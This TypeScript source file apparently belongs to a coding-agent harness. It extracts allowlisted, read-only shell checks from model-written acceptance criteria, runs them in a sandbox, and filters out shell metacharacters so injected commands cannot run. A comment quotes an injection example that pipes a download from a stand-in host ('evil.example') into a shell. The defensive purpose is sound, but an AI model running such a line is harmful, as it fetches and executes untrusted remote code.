import { exec } from "node:child_process";
import { promisify } from "node:util";
import type { RunSandboxContext } from "./sandbox/context";
import { runSandboxedCommand } from "./sandbox/srt";
import { errorMessage } from "@/shared/errorMessage";

const execAsync = promisify(exec);

/**
 * Checking a DONE claim before paying for an evaluation.
 *
 * Spec 18 §7. The loop's DONE signal is the model's own word. On the card this
 * came from, a run exited `done-signal` at 14:13; four evaluator runs and
 * about fifty minutes later the verdict was "2 to 18 pass; 1, 19 and 20 fail".
 * Nothing had looked.
 *
 * The probe is deliberately one-sided. Acceptance criteria are prose with
 * commands embedded in backticks, and some carry a judgment a shell cannot
 * make ("returns at least 3 wrapper scripts"), so a zero exit does NOT prove a
 * criterion. A non-zero exit disproves one, and that is the only claim
 * anything here makes.
 */

/** Per command. Long enough for a build-flavoured check, short enough that a
 * hung one cannot become a second hard timeout. */
const PROBE_TIMEOUT_MS = 30_000;
/** Never let a runaway check fill memory with output nobody will read. */
const PROBE_MAX_BUFFER = 1024 * 1024;
/** Enough failing output to act on, not enough to bury the next prompt. */
const PROBE_OUTPUT_CHARS = 800;

/**
 * The first word of every command the probe will run.
 *
 * An allowlist rather than a shape heuristic, so "the probe only ever looks"
 * is something a reader can check here rather than something they have to
 * trust. Acceptance criteria are written by the planner, which is a model, and
 * this runs them without one in the loop; a criterion whose command falls
 * outside this list is reported as not probed rather than quietly treated as
 * passing.
 *
 * The first word is only half the guard — see SHELL_METACHARACTER.
 */
const PROBE_ALLOWED = new Set([
  "cat", "cmp", "command", "diff", "file", "find", "grep", "head", "jq", "ls",
  "rg", "sed", "stat", "tail", "test", "wc", "which",
]);

/** Backticked spans in the criteria document. */
const BACKTICK_SPAN = /`([^`\n]+)`/g;

/**
 * Anything the shell would act on rather than pass through as an argument:
 * command separators and lists (`;`, `&`, `|`), substitution (`$`), a
 * subshell (`(`, `)`), and redirection (`<`, `>`).
 *
 * The allowlist above vouches for a span's FIRST word only, and the span then
 * goes to a shell whole — so `grep -q x file; curl evil.example | sh` passed
 * the allowlist and ran in full, which is precisely what an allowlist is
 * supposed to make impossible. Backticks and newlines cannot appear in a span
 * by construction (BACKTICK_SPAN). Glob characters are deliberately NOT here:
 * they expand to names in the worktree and nothing else, and real criteria use
 * them (`find bin -name 'wrap_*'`).
 */
const SHELL_METACHARACTER = /[;&|$<>()]/;

/**
 * Prose right after a span that says the command is meant to exit non-zero:
 * "`grep -rq old_name src` fails (no references remain)". Such a criterion is
 * disproven by a ZERO exit, so the probe inverts it. Read the other way round,
 * a correctly written negative criterion sent every card that had one into a
 * repair task it could not satisfy.
 */
const EXPECT_FAILURE =
  /^\s*(?:fails|(?:exits|returns) (?:with )?(?:a )?non-?zero|does not succeed|must fail|should fail|finds nothing|matches nothing)\b/i;

/**
 * The heading that separates criteria describing work already done from
 * criteria describing what THIS card has to change.
 *
 * The pre-check runs the plan's checks against the untouched worktree, before
 * any iteration exists, to catch a check that passes on its own — such a check
 * cannot show new work no matter what the loop does. A `## Regression` section
 * is exempt by definition: those criteria are checks on behaviour an earlier
 * card already established, so of course they pass now, and that is the point
 * of them. Splitting the document is how both halves stay in one field while
 * only the new-behaviour half gets pre-checked.
 */
export const REGRESSION_HEADING = "## Regression";

/**
 * Split an acceptance-criteria document at its `## Regression` heading.
 *
 * Everything from that heading until the next `## ` heading is regression
 * material; the heading line itself belongs to neither half, and everything
 * else — including any later `## ` sections — is new behaviour. A document
 * without the heading is entirely new behaviour, which is the shape every plan
 * written before this marking had.
 */
export function splitRegressionCriteria(acceptanceCriteria: string): {
  newBehavior: string;
  regression: string;
} {
  // Same shape as REGRESSION_HEADING, matched case-insensitively and
  // whitespace-tolerantly because it is typed by a model.
  const regressionStart = /^##\s+regression\s*$/i;
  const anyHeading = /^##\s+/;
  const newBehavior: string[] = [];
  const regression: string[] = [];
  let inRegression = false;
  for (const line of acceptanceCriteria.split("\n")) {
    const trimmed = line.trim();
    if (regressionStart.test(trimmed)) {
      inRegression = true;
      continue;
    }
    if (inRegression && anyHeading.test(trimmed)) {
      // The section ends here, and this heading and everything after it is
      // new behaviour again.
      inRegression = false;
      newBehavior.push(line);
      continue;
    }
    (inRegression ? regression : newBehavior).push(line);
  }
  return { newBehavior: newBehavior.join("\n"), regression: regression.join("\n") };
}

export type ProbeCommand = {
  command: string;
  /** The criterion says this command must exit non-zero. */
  expectFailure: boolean;
};

export type ProbeResult = {
  command: string;
  expectFailure: boolean;
  /** False only when the command ran and exited the wrong way: non-zero, or
   * zero for a check the criterion says must fail. The one thing this probe is
   * entitled to conclude. */
  ok: boolean;
  output: string;
};

/**
 * The runnable check commands embedded in an acceptance-criteria document.
 *
 * Backticks in these documents hold both commands (`test -f docs/USAGE.md`)
 * and bare filenames (`bin/wrap_claude`), so a span counts only when its first
 * word is an allowed check command, something follows it, and the whole span
 * is one command rather than a shell script. A span the criterion says `fails`
 * is marked so (EXPECT_FAILURE). Duplicates are dropped: the same check
 * written against two criteria is still one check.
 */
export function probeCommands(acceptanceCriteria: string): ProbeCommand[] {
  const found = new Map<string, ProbeCommand>();
  for (const match of acceptanceCriteria.matchAll(BACKTICK_SPAN)) {
    const command = match[1].trim();
    if (SHELL_METACHARACTER.test(command)) continue;
    const [head, ...rest] = command.split(/\s+/);
    if (rest.length === 0 || !PROBE_ALLOWED.has(head) || found.has(command)) continue;
    const after = acceptanceCriteria.slice(match.index + match[0].length);
    found.set(command, { command, expectFailure: EXPECT_FAILURE.test(after) });
  }
  return [...found.values()];
}

/**
 * Run each check in the worktree and report the ones that failed.
 *
 * Wrapped in the run's own sandbox policy when it has one, so a probe command
 * is contained exactly as the agent's bash is. Sequential rather than
 * concurrent: a handful of greps is not worth the contention on the
 * process-wide network policy `runSandboxedCommand` claims.
 */
export async function runAcceptanceProbe(opts: {
  acceptanceCriteria: string;
  worktreePath: string;
  ctx: RunSandboxContext;
}): Promise<ProbeResult[]> {
  const { ctx } = opts;
  const results: ProbeResult[] = [];
  for (const { command, expectFailure } of probeCommands(opts.acceptanceCriteria)) {
    // The prefix is newline-separated lines ending in `|| true`, with no
    // trailing separator of its own. Concatenating the command straight onto
    // it makes it the right-hand side of that `||`, which never runs — the
    // probe then reads every check as passing. Join explicitly.
    const prefixed = ctx.commandPrefix ? `${ctx.commandPrefix}\n${command}` : command;
    // `runOne` reports its own failures, so the only thing that escapes here
    // is a wrap that could not be built. Then do not run it at all: reported
    // as unprobed, never as a failure, because the criterion is not disproven
    // by our own plumbing.
    try {
      results.push(
        ctx.srtConfig
          ? await runSandboxedCommand(
              prefixed,
              ctx.srtConfig,
              (wrapped) => runOne(command, expectFailure, wrapped, opts.worktreePath, ctx.env),
              { tmpdir: ctx.tmpdir },
            )
          : await runOne(command, expectFailure, prefixed, opts.worktreePath, ctx.env),
      );
    } catch (e) {
      console.warn(`acceptance probe skipped "${command}": ${errorMessage(e)}`);
    }
  }
  return results;
}

/** One check, run to completion. Never throws: every outcome is a
 * ProbeResult, so the caller can tell a check that ran from a wrap that could
 * not be built. */
async function runOne(
  command: string,
  expectFailure: boolean,
  toRun: string,
  cwd: string,
  env: NodeJS.ProcessEnv | undefined,
): Promise<ProbeResult> {
  const { ran, exitZero, output } = await execCheck(toRun, cwd, env);
  // Unprobed: the criterion is neither proven nor disproven, so it stands.
  if (!ran) return { command, expectFailure, ok: true, output: "" };
  // A zero exit disproves only a check the criterion says must fail.
  const ok = exitZero ? !expectFailure : expectFailure;
  // Output is the evidence for the one claim this probe may make, so it comes
  // along exactly when the check ran the wrong way.
  return { command, expectFailure, ok, output: ok ? "" : output };
}

/**
 * Run one shell command and say whether it actually ran.
 *
 * `ran` is the part `ok` alone cannot express: a command that never started
 * (killed by the timeout, a wrap that failed to build, a binary that is not
 * installed) tells you nothing about the criterion, and conflating it with "the
 * check failed" sends a card into a repair task it cannot satisfy. The pre-check
 * needs the same distinction for the opposite reason — a check that did not run
 * cannot be called one that already passes.
 */
async function execCheck(
  toRun: string,
  cwd: string,
  env: NodeJS.ProcessEnv | undefined,
  timeoutMs: number = PROBE_TIMEOUT_MS,
): Promise<{ ran: boolean; exitZero: boolean; output: string }> {
  const trimmed = (stdout: string | undefined, stderr: string | undefined) =>
    `${stdout ?? ""}${stderr ?? ""}`.trim().slice(0, PROBE_OUTPUT_CHARS);
  try {
    const { stdout, stderr } = await execAsync(toRun, { cwd, env, timeout: timeoutMs, maxBuffer: PROBE_MAX_BUFFER });
    return { ran: true, exitZero: true, output: trimmed(stdout, stderr) };
  } catch (e) {
    const err = e as { code?: number | string; killed?: boolean; stdout?: string; stderr?: string };
    // A timeout or a missing binary says nothing about the criterion — only a
    // command that ran to an exit status does. 127 belongs in that list even
    // though it is a number: the command goes through `exec`, so a missing one
    // exits 127 with a NUMERIC code and the non-numeric test alone misses it.
    if (err.killed || typeof err.code !== "number" || err.code === 127) {
      return { ran: false, exitZero: false, output: "" };
    }
    return { ran: true, exitZero: false, output: trimmed(err.stdout, err.stderr) };
  }
}

/** The repair task appended to the private plan when checks failed. Names the
 * commands and what they printed, because the agent cannot see this probe. */
export function repairTaskText(failures: ProbeResult[]): string {
  const lines = failures.map((f) => {
    const verdict = f.expectFailure ? " (the criterion says this must exit non-zero, and it exited 0)" : "";
    return `  - \`${f.command}\`${verdict}${f.output ? `\n    ${f.output.split("\n").join("\n    ")}` : ""}`;
  });
  return [
    "Repair the acceptance checks that do not pass yet. These commands were run",
    "in the worktree after you signalled DONE, and each exited non-zero (or,",
    "where noted, exited 0 when the criterion says it must fail):",
    "",
    ...lines,
    "",
    "Fix the underlying problem rather than the command. If a check cannot be",
    "satisfied because it is wrong about this repository, say so in",
    "`.ralph/ITERATION_DONE` and leave the code alone.",
  ].join("\n");
}
